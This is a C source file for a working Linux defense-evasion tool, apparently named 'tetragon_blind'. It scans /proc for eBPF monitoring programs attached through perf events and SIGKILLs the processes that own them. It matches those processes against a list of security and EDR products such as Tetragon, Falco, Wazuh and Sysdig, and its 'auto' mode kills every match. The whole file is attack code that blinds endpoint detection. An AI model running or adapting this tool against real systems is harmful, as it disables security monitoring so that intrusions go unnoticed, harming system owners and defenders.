#define _GNU_SOURCE
#include <linux/bpf.h>
#include <sys/syscall.h>
#include <sys/stat.h>
#include <sys/signal.h>
#include <stddef.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <errno.h>
#include <dirent.h>
#include <fcntl.h>

#define BPF_ATTR_SZ(field) \
    (unsigned int)(offsetof(union bpf_attr, field) + sizeof(((union bpf_attr *)0)->field))

static int bpf_call(int cmd, union bpf_attr *a, unsigned int sz)
{
    return (int)syscall(__NR_bpf, cmd, a, sz);
}

typedef struct {
    pid_t pid;
    int   fdnum;
    uint32_t prog_id;
    uint32_t prog_type;
    char comm[64];
} PerfBpfEntry;

#define MAX_ENTRIES 512
static PerfBpfEntry entries[MAX_ENTRIES];
static int nentries = 0;

static const char *prog_type_str(uint32_t t)
{
    switch (t) {
    case BPF_PROG_TYPE_KPROBE:         return "kprobe";
    case BPF_PROG_TYPE_TRACEPOINT:     return "tracepoint";
    case BPF_PROG_TYPE_RAW_TRACEPOINT: return "raw_tracepoint";
    case BPF_PROG_TYPE_PERF_EVENT:     return "perf_event";
    case BPF_PROG_TYPE_LSM:            return "lsm";
    case BPF_PROG_TYPE_TRACING:        return "tracing";
    default:                           return "other";
    }
}

static int is_monitoring_type(uint32_t t)
{
    return t == BPF_PROG_TYPE_KPROBE
        || t == BPF_PROG_TYPE_TRACEPOINT
        || t == BPF_PROG_TYPE_RAW_TRACEPOINT
        || t == BPF_PROG_TYPE_PERF_EVENT
        || t == BPF_PROG_TYPE_LSM
        || t == BPF_PROG_TYPE_TRACING;
}

static uint32_t get_prog_type(uint32_t prog_id)
{
    union bpf_attr gfd = {}; gfd.prog_id = prog_id;
    int fd = bpf_call(BPF_PROG_GET_FD_BY_ID, &gfd, BPF_ATTR_SZ(prog_id));
    if (fd < 0) return 0;

    struct bpf_prog_info info = {};
    union bpf_attr gi = {};
    gi.info.bpf_fd   = (uint32_t)fd;
    gi.info.info_len = sizeof(info);
    gi.info.info     = (uint64_t)(uintptr_t)&info;
    bpf_call(BPF_OBJ_GET_INFO_BY_FD, &gi, BPF_ATTR_SZ(info));
    close(fd);
    return info.type;
}

static void get_comm(pid_t pid, char *buf, size_t sz)
{
    char path[64];
    snprintf(path, sizeof(path), "/proc/%d/comm", (int)pid);
    FILE *f = fopen(path, "r");
    if (!f) { strncpy(buf, "?", sz); return; }
    fgets(buf, (int)sz, f);
    fclose(f);
    buf[strcspn(buf, "\n")] = '\0';
}

static void scan_fdinfo(void)
{
    DIR *proc = opendir("/proc");
    if (!proc) { perror("/proc"); return; }

    struct dirent *de;
    while ((de = readdir(proc))) {
        if (!de->d_name[0] || de->d_name[0] < '1' || de->d_name[0] > '9') continue;
        pid_t pid = (pid_t)atoi(de->d_name);

        char fdinfo_path[320];
        snprintf(fdinfo_path, sizeof(fdinfo_path), "/proc/%.20s/fdinfo", de->d_name);
        DIR *fdinfo = opendir(fdinfo_path);
        if (!fdinfo) continue;

        struct dirent *fde;
        while ((fde = readdir(fdinfo)) && nentries < MAX_ENTRIES) {
            if (fde->d_name[0] == '.') continue;

            char ep[640];
            snprintf(ep, sizeof(ep), "%.*s/%.255s", 320, fdinfo_path, fde->d_name);
            FILE *f = fopen(ep, "r");
            if (!f) continue;

            char line[256];
            while (fgets(line, sizeof(line), f)) {
                if (strncmp(line, "prog_id:", 8) != 0) continue;
                uint32_t prog_id = (uint32_t)atol(line + 9);
                if (!prog_id) continue;

                uint32_t ptype = get_prog_type(prog_id);
                if (!is_monitoring_type(ptype)) continue;

                PerfBpfEntry *e = &entries[nentries++];
                e->pid      = pid;
                e->fdnum    = atoi(fde->d_name);
                e->prog_id  = prog_id;
                e->prog_type = ptype;
                get_comm(pid, e->comm, sizeof(e->comm));
                break;
            }
            fclose(f);
        }
        closedir(fdinfo);
    }
    closedir(proc);
}

static const char *edr_patterns[] = {
    "edr_kmod", "edr_delta", "edr_epsilon", "edr_theta", "tetragon", "cilium",
    "falco", "sysdig", "scap", "wazuh", "ossec", "ebpf",
    NULL
};

static int is_edr(const char *comm)
{
    for (int i = 0; edr_patterns[i]; i++) {
        if (strcasestr(comm, edr_patterns[i])) return 1;
    }
    return 0;
}

static void cmd_scan(void)
{
    scan_fdinfo();
    if (!nentries) {
        printf("[*] no perf-attached BPF monitoring programs found\n");
        printf("    (all BPF progs use modern BPF_LINK - use bpf_detach_all)\n");
        return;
    }

    printf("[*] perf-event-attached BPF monitoring programs (not via BPF_LINK):\n");
    printf("  %-6s %-6s %-8s %-24s %-20s %s\n",
           "pid", "fd", "prog_id", "comm", "prog_type", "edr?");
    printf("  %s\n", "----------------------------------------------------------------------");
    for (int i = 0; i < nentries; i++) {
        PerfBpfEntry *e = &entries[i];
        printf("  %-6d %-6d %-8u %-24s %-20s %s\n",
               (int)e->pid, e->fdnum, e->prog_id,
               e->comm,
               prog_type_str(e->prog_type),
               is_edr(e->comm) ? "[!EDR]" : "");
    }
    printf("\n[*] to remove: kill the owning process (closes perf_event fd → detaches BPF)\n");
    printf("    tetragon_blind kill <comm>  or  kill -9 <pid>\n");
}

static void cmd_kill_pid(pid_t pid)
{
    char comm[64];
    get_comm(pid, comm, sizeof(comm));
    printf("[*] killing pid %d (%s) ... ", (int)pid, comm);
    if (kill(pid, SIGKILL) == 0)
        printf("ok\n");
    else
        perror("");
}

static void cmd_auto(int dry_run)
{
    scan_fdinfo();
    if (!nentries) {
        printf("[*] no perf-attached BPF monitoring programs found\n");
        return;
    }

    pid_t killed[MAX_ENTRIES];
    int nkilled = 0;

    printf("[*] auto: killing owners of perf-attached monitoring BPF progs\n");
    for (int i = 0; i < nentries; i++) {
        PerfBpfEntry *e = &entries[i];
        if (!is_edr(e->comm)) continue;

        int dup = 0;
        for (int k = 0; k < nkilled; k++)
            if (killed[k] == e->pid) { dup = 1; break; }
        if (dup) continue;
        killed[nkilled++] = e->pid;

        printf("  [!] pid=%-6d comm=%-24s prog_id=%u (%s)\n",
               (int)e->pid, e->comm, e->prog_id, prog_type_str(e->prog_type));
        if (!dry_run) {
            if (kill(e->pid, SIGKILL) == 0)
                printf("      [+] killed\n");
            else
                printf("      [!] kill failed: %s\n", strerror(errno));
        } else {
            printf("      [dry] would kill\n");
        }
    }
    if (!nkilled) printf("  [*] no processes matched EDR patterns\n");
}

static void cmd_kill_comm(const char *name, int dry_run)
{
    scan_fdinfo();

    pid_t done[MAX_ENTRIES];
    int ndone = 0;

    for (int i = 0; i < nentries; i++) {
        PerfBpfEntry *e = &entries[i];
        if (!strstr(e->comm, name)) continue;

        int dup = 0;
        for (int k = 0; k < ndone; k++)
            if (done[k] == e->pid) { dup = 1; break; }
        if (dup) continue;
        done[ndone++] = e->pid;

        printf("[*] pid=%-6d comm=%-24s prog_id=%u (%s)\n",
               (int)e->pid, e->comm, e->prog_id, prog_type_str(e->prog_type));
        if (!dry_run) {
            if (kill(e->pid, SIGKILL) == 0) printf("  [+] killed\n");
            else printf("  [!] %s\n", strerror(errno));
        } else {
            printf("  [dry] would kill\n");
        }
    }
    if (!ndone)
        printf("[*] no perf-attached BPF prog owner matching '%s'\n", name);
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr, "usage: %s <scan|auto|kill-pid|kill-comm>\n", argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "scan") == 0) {
        cmd_scan();
    } else if (strcmp(argv[1], "auto") == 0) {
        int dry = (argc >= 3 && strcmp(argv[2], "--dry") == 0);
        cmd_auto(dry);
    } else if (strcmp(argv[1], "kill-pid") == 0 && argc >= 3) {
        cmd_kill_pid((pid_t)atoi(argv[2]));
    } else if (strcmp(argv[1], "kill-comm") == 0 && argc >= 3) {
        int dry = (argc >= 4 && strcmp(argv[3], "--dry") == 0);
        cmd_kill_comm(argv[2], dry);
    } else {
        fprintf(stderr, "unknown: %s\n", argv[1]); return 1;
    }
    return 0;
}
